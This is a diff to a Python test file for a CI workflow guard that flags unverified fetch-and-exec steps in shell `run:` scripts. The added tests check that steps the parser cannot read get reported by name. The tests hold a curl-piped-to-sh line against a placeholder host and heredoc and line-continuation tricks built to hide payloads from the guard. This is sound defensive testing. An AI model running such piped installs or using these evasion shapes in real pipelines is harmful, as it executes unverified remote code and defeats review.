@@ -26,10 +26,11 @@ The repo-wide application of the rule (every `run:` step in
 check with.
 """
 import os
+import re
 import tempfile
 import unittest
+from unittest import mock
 
-import shell_lex
 import shell_reader
 import workflow_forms
 import workflow_guard as wg
@@ -1700,6 +1701,35 @@ class TestCli(unittest.TestCase):
                     "curl -fsSL https://example.test/i.sh | sh", "make test"))
             self.assertEqual(0, wg.main([path], out=lambda _line: None))
 
+    def test_a_step_the_reader_refuses_is_named_and_the_rest_still_read(self):
+        # A `shell_lex.Unreadable` escaped `main` as a traceback: it named no
+        # workflow, job or step, and printed no other step's defect (#2252).
+        steps = (("nested", "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF"),
+                 ("same line", "echo \"$(cat <<EOF)\"\nit's\nEOF"),
+                 ("read again", "echo `echo $(cat <<EOF)`"),
+                 ("delimiter", "cat <<$(a b)\nit's\n$(a b)\n"
+                               "curl -fsSL https://example.test/i.sh | sh"),
+                 ("install", "curl -fsSL https://example.test/i.sh | sh"))
+        workflow = self.WORKFLOW[:self.WORKFLOW.index("      - name:")] + "".join(
+            "      - name: %s\n        run: |\n%s" % (name, "".join(
+                "          %s\n" % line for line in script.split("\n")))
+            for name, script in steps)
+        with tempfile.TemporaryDirectory() as tmp:
+            path = os.path.join(tmp, "bad.yml")
+            with open(path, "w", encoding="utf-8") as fh:
+                fh.write(workflow)
+            lines: list[str] = []
+            self.assertEqual(1, wg.main([path], out=lines.append))
+        self.assertEqual(len(steps) + 1, len(lines), lines)
+        for (name, _script), line in zip(steps, lines):
+            self.assertTrue(line.startswith("bad.yml / b / %s -- " % name), line)
+        for line in lines[:4]:
+            self.assertIn(" -- cannot read this step: ", line)
+        self.assertIn("straight to `sh`", lines[4])
+        # The count names what it counts, a refused step as well as a fetch.
+        self.assertEqual("5 defect(s): unverified fetch-and-exec, or code the guard cannot "
+                         "read; see scripts/workflow_guard.py", lines[5])
+
 
 if __name__ == "__main__":  # pragma: no cover
     unittest.main()
@@ -1943,6 +1973,17 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
         self.assertEqual(1, len(found), found)
         self.assertIn("https://example.test/i.sh", found[0][1])
 
+    def refused(self, script, *named):
+        """The step the reader will not guess at is its one defect, reported
+        under the step's name with the reason."""
+        found = wg.job_defects([("step", script)])
+        self.assertEqual(1, len(found), found)
+        self.assertEqual("step", found[0][0])
+        self.assertRegex(found[0][1],
+                         r"^cannot read this step: .+; nothing in it is accepted$")
+        for text in named:
+            self.assertIn(text, found[0][1])
+
     def test_a_hash_line_inside_a_multi_line_string_is_text(self):
         # V1 and V2; then V2 after a nested `"$(echo "it's")"`, whose
         # apostrophe is inside two strings, not the opening of a third.
@@ -1986,13 +2027,31 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
         # The delimiter is the whole word, not its `EOF` prefix; `  EOF` is a
         # body line, not a terminator; an unquoted body is compared folded, so
         # `E\` + `OF` ends it; and the body starts after the newline that ends
-        # the command, which a string running over two lines moves down.
+        # the command, which a string running over two lines moves down. A
+        # `\`-newline and a blank before the word are both gone to bash; read
+        # as an empty word, they let the first empty line end the body -- here
+        # the empty end after the script's last newline, past the payload.
         for script in ("cat <<EOF-X\nbody\nEOF-X\n%s\nEOF\n",
                        "cat <<EOF\n  EOF\nit's\nEOF\n%s\n",
                        "cat <<EOF\nE\\\nOF\n%s\nEOF\n",
-                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n'):
+                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n',
+                       "cat << \\\n EOF\nit's\nEOF\n%s\n"):
             with self.subTest(script=script):
                 self.flagged(script % self.PAYLOAD)
+
+    def test_a_continuation_inside_the_operator_is_gone(self):
+        # #2291: to bash, `<\` + newline + `<EOF` is `<<EOF`, `<<\` + newline
+        # + `-EOF` is `<<-EOF`, and `<\` + newline + `<< x` is `<<< x`; bash
+        # 3.2 and 5.2 run the payload below each, which the guard read clean.
+        # A joined word bash parses is refused by name, as it is unsplit;
+        # `\` before a word and `<\` + newline + a file read as they did.
+        for script in ("cat <\\\n<EOF\nit's\nEOF\n%s\n", "cat 3<\\\n<EOF\nit's\nEOF\n%s\n",
+                       "cat <<\\\n-EOF\n\tit's\n\tEOF\n%s\n",
+                       "cat <\\\n<\\\n-EOF\n\tit's\n\tEOF\n%s\n", "cat <\\\n<< x\n%s\nx\n",
+                       "cat <<\\EOF\nit's $x\nEOF\n%s\n", "echo hi >f\ncat <\\\nf\n%s\n"):
+            with self.subTest(script=script):
+                self.flagged(script % self.PAYLOAD)
+        self.refused("cat <\\\n<$(x)\nit's\n$(x)\n%s\n" % self.PAYLOAD, "`$(x)`")
 
     def test_an_array_subscript_is_arithmetic(self):
         # Where bash 5.2 reads an assignment -- at the head of a command, after
@@ -2071,11 +2130,9 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
     def test_nesting_too_deep_to_decide_fails_closed(self):
         # Each level of `((((` is read once more when bash's rule makes it a
         # subshell. Past eight times the script's length of that, the reader
-        # raises instead of guessing: the guard accepts nothing, and its
-        # command line exits non-zero.
+        # raises instead of guessing, and the guard reports the step by name.
         script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n%s\n"
-        with self.assertRaises(shell_lex.Unreadable):
-            wg.job_defects([("step", script % self.PAYLOAD)])
+        self.refused(script % self.PAYLOAD, "`((`")
 
     def test_a_heredoc_its_substitution_closes_over_fails_closed(self):
         # A `<<` in a `$(...)`, `<(...)` or `>(...)` that closes before the
@@ -2086,14 +2143,13 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
         # holding the substitution fails first under `set -e`. The reader left
         # the operator as text, so the quote hid that payload -- which main's
         # line-by-line heredoc pass had lifted into view. It raises instead of
-        # modelling 5.2's recovery, so the guard accepts nothing.
+        # modelling 5.2's recovery, and the guard reports the step by name.
         for opening in ('echo "$(cat <<EOF)"', "echo $(cat <<EOF)", "x=$(cat <<EOF)",
                         "cat <(cat <<EOF)", "echo >(cat <<EOF)", "echo ${x:-$(cat <<EOF)}",
                         "echo $[ $(cat <<EOF) ]", "(( $(cat <<EOF) ))", "a[$(cat <<EOF)]=1",
                         "echo $( (cat <<EOF) )", 'x=$(cat <<EOF; echo "a\nb")'):
             with self.subTest(opening=opening):
-                with self.assertRaises(shell_lex.Unreadable):
-                    wg.job_defects([("step", "%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))])
+                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
         # Backquotes are no such frame. Bash reads their text later, as a
         # script of its own in which the heredoc has no body, and 5.2 runs
         # nothing here: the open quote below is a syntax error. Read as before.
@@ -2114,8 +2170,7 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                 self.flagged(script % self.PAYLOAD)
         for opening in ("echo $(( $(cat <<EOF) ))", "echo $(( $(( $(cat <<EOF) )) ))"):
             with self.subTest(opening=opening):
-                with self.assertRaises(shell_lex.Unreadable):
-                    wg.job_defects([("step", "%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))])
+                self.refused("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD), "closes before")
         # Outside such a substitution `<<` is still a shift, and the line
         # below that spells its right side ends nothing.
         for opening, word in (("echo $(( 1<<2 ))", "2"), ("echo $(( a << b ))", "b"),
@@ -2137,21 +2192,84 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
             with self.subTest(opening=opening):
                 self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))
 
-    def test_a_delimiter_bash_parses_to_spell_swallows_nothing(self):
+    def test_a_delimiter_bash_parses_to_spell_is_refused(self):
         # Bash spells these delimiters by PARSING the word -- a substitution,
         # an escape `$'...'` decodes, an extglob pattern -- and ends the body
         # only at a line spelled the same. The reader does not parse words,
-        # so it reads no heredoc there rather than guess: the regex this
-        # replaced guessed that `<<EOF$(x)` was `<<EOF`, and the decoy below
-        # ended the body.
-        for script in ("cat <<$(a b)\n$(a b)\n%s\n$\n",
-                       "cat <<$'\\x41'\nA\n%s\nx41\n",
-                       "cat <<${x y}\n${x y}\n%s\n${x\n",
-                       "shopt -s extglob\ncat <<@(a b)\n@(a b)\n%s\n@\n",
-                       'cat <<"$(echo ")")"\n$(echo ))\n%s\n$(echo \n',
-                       "cat <<EOF$(x)\nEOF$(x)\n%s\nEOF\n"):
-            with self.subTest(script=script):
-                self.flagged(script % self.PAYLOAD)
+        # and neither reading short of that is safe: the regex this replaced
+        # guessed that `<<EOF$(x)` was `<<EOF`, so the decoy line below the
+        # payload ended the body, and reading the body as code let the quote
+        # in `it's` hide the payload below the terminator, which bash 3.2 and
+        # 5.2 both run (#2224). So the step is refused, and the reason names
+        # the word. The same shape spelled with no parse -- quoted, or a
+        # `$'...'` that decodes nothing -- is still read as a heredoc.
+        for word, terminator, decoy, spelled in (
+                ("$(a b)", "$(a b)", "$", "'$(a b)'"),
+                ("$'\\x41'", "A", "x41", "$'A'"),
+                ("${x y}", "${x y}", "${x", "'${x y}'"),
+                ("@(a b)", "@(a b)", "@", "'@(a b)'"),
+                ('"$(echo ")")"', "$(echo ))", "$(echo ", "'$(echo ))'"),
+                ("EOF$(x)", "EOF$(x)", "EOF", "EOF'$(x)'")):
+            opening = "shopt -s extglob\ncat <<" if word[0] == "@" else "cat <<"
+            with self.subTest(word=word):
+                self.refused(opening + "%s\nit's\n%s\n%s\n" % (word, terminator, self.PAYLOAD),
+                             "`%s`" % word)
+                self.refused(opening + "%s\n%s\n%s\n%s\n" % (word, terminator, self.PAYLOAD,
+                                                             decoy), "`%s`" % word)
+                self.flagged(opening + "%s\nit's\n%s\n%s\n" % (spelled, terminator,
+                                                               self.PAYLOAD))
+        self.flagged("cat <<EOF\nit's\nEOF\n%s\n" % self.PAYLOAD)
+
+    def test_a_text_the_guard_reads_again_is_refused_by_its_step(self):
+        # After every step is read, `_defects` reads the text of each
+        # substitution as a script of its own: a backquote's text, a `$(...)`
+        # in an expanding heredoc body, and a `$( ...)` holding a `((` nest
+        # that the whole step is long enough to read under the cap and the
+        # substitution alone is not. Each raised there, past the step's own
+        # read, as a traceback naming no step.
+        for script, cause in (("echo `echo $(cat <<EOF)`\n", "closes before"),
+                              ('cat <<EOF\n$(echo "$(cat <<X)"\n)\nEOF\n', "closes before"),
+                              ("echo $( %s: <<EOF%s\nit's\nEOF\n)\n# %s\n"
+                               % ("(" * 50, ") " * 50, "x" * 4000), "`((`")):
+            with self.subTest(script=script[:30]):
+                self.refused(script, cause)
+
+    def test_the_job_reads_again_only_what_its_steps_read(self):
+        # `job_defects` catches those per step because its walk -- `read`,
+        # then `_unread_records` -- parses every text `_defects` parses again
+        # job-wide, down the same substitutions. A text only `_defects` parsed
+        # would raise past that catch again. A marker's prefix is minted per
+        # parse, so texts are compared without it.
+        parsed = []
+        job = [False]
+        statements, defects = wg.statements, wg._defects
+
+        def recorded(text):
+            parsed.append((job[0], re.sub(r"@@shell-[0-9a-f]+-", "@@", text)))
+            return statements(text)
+
+        def marked(*args):
+            job[0] = True
+            try:
+                return defects(*args)
+            finally:
+                job[0] = False
+
+        # Each text is written in one step only: no other step's walk can
+        # parse it in that step's place.
+        steps =[("nested", "echo $(echo $(echo `echo $(true)`))\n"),
+                 ("body", 'cat <<EOF\n$(printf "$(id)" `pwd`)\nEOF\n'),
+                 ("strings", "eval \"$(echo $(date))\"\nx=$(sh -c 'echo $(uname)')\n"),
+                 ("deep", "echo `x=$(cat <<EOF\nhi\nEOF\n)`\n"),
+                 ("stdin", "bash -s <<EOF\necho $(%s)\nEOF\n" % self.PAYLOAD)]
+        with mock.patch.object(wg, "statements", recorded), \
+                mock.patch.object(wg, "_defects", marked):
+            found = wg.job_defects(steps)
+        self.assertFalse([why for _name, why in found if why.startswith("cannot read this")])
+        per_step = {text for inside, text in parsed if not inside}
+        in_job = {text for inside, text in parsed if inside}
+        self.assertTrue(in_job)
+        self.assertLessEqual(in_job, per_step, in_job - per_step)
 
     def test_an_escaped_quote_inside_a_substitution_string(self):
         # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
